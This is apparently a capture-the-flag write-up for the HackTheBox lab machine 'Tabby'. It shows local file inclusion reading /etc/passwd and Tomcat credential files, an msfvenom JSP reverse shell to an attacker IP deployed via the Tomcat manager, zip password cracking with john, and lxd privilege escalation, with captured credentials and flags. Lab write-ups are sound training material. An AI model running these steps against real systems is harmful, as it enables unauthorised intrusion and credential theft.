
Target : 10.129.31.247

Started off with the port scan : 22,80,8080

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
```

Enumerating Port : 80

Subdomain Fuzzing using ffuf:

`ffuf -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://megahosting.htb" -H "Host: FUZZ.megahosting.htb" -fl 374`

Got nothing interesting here!

Directory Bruteforcing using gobuster:

`gobuster dir -u "http://megahosting.htb/" -w ~/SecLists/Discovery/Web-Content/common.txt`

```
/.htpasswd            (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/assets               (Status: 301) [Size: 319] [--> http://megahosting.htb/assets/]
/favicon.ico          (Status: 200) [Size: 766]
/files                (Status: 301) [Size: 318] [--> http://megahosting.htb/files/]
/index.php            (Status: 200) [Size: 14175]
/server-status        (Status: 403) [Size: 280]
```

http://megahosting.htb/news.php?file= 

This seems like vulnerable to local file inclusion, 

`http://megahosting.htb/news.php?file=../../../../etc/passwd`

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash
```

Port no: 8080

It discloses some endpoints like apache tomcat, config file paths.

![](../Screenshot%202026-07-13%20at%208.35.28%20PM.png)

We can utilise this to get the config file using local file inclusion, we found earlier.

/usr/share/tomcat9/etc/tomcat-users.xml

Found the credential 

`tomcat : $3cureP4s5w0rd123!`

Further Enumeration in port : 8080

`gobuster dir -u "http://10.129.34.1:8080" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`

```
docs                 (Status: 302) [Size: 0] [--> /docs/]
examples             (Status: 302) [Size: 0] [--> /examples/]
host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
index.html           (Status: 200) [Size: 1895]
manager              (Status: 302) [Size: 0] [--> /manager/]
```

**Doing directory enumeration again in /manager**

`gobuster dir -u "http://10.129.34.1:8080/manager/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --username tomcat --password '$3cureP4s5w0rd123!'`

```
html                 (Status: 403) [Size: 3446]
images               (Status: 302) [Size: 0] [--> /manager/images/]
status/ready         (Status: 200) [Size: 7136]
status               (Status: 200) [Size: 7004]
text                 (Status: 200) [Size: 31]
```

And it confirms `/manager/text` endpoint which is running Apache tomcat9 - Host manager app -- text interface service. (https://tomcat.apache.org/tomcat-9.0-doc/host-manager-howto.html)

![](../Pasted%20image%2020260716145818.png)

As of documentation, only the user with manage-script enabled can access "text interface"

But, we did with the credential pair of tomcat. Let's list hosts using the above screenshot

```
USR=tomcat
PASS=\$3cureP4s5w0rd123!

curl -u ${USR}:${PASS} http://10.129.34.1:8080/manager/text/list
```

![](../Pasted%20image%2020260716150158.png)

Now, we now tomcat is running, it renders java, generated a reverse shell payload with msfvenom

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.241 LPORT=1234 -f war -o shell.war`

Uploading the payload:

`curl -u ${USR}:${PASS} http://10.129.34.1:8080/manager/text/deploy?path=/examples/shell --upload-file shell.war`

Triggering the payload: `curl "http://10.129.34.1:8080/examples/shell/"`

![](../Pasted%20image%2020260716151328.png)

And we got the shell as user - tomcat.

And while exploring the application found a backup file in /var/www/html/files/16162020_backup.zip

which is password protected, so we need to crack it.

```johntheripper
zip2john backup.zip > hash

john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](../Pasted%20image%2020260716152719.png)

backup file password is `admin@it` and searched the zip file and got nothing interesting in here. 

Then, just reused this password to login `su ash` and successfully gained access

`user.txt : 4bca0501006a1d9f502f0f86195969c7`

Root Escalation:

```
ash@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

This user belongs to `lxd` group

Refer `Linux Privesc` for LxD Exploitation.

![](../Pasted%20image%2020260716155927.png)

`root.txt : 2b0ccb6687290c6863b2d781fecf1383`

Got the root access.


**To be noted:**

1. Need to do strong enumeration, i have missed enumerating /manager and got stucked in /host-manager as it's not accessed for the text interface service.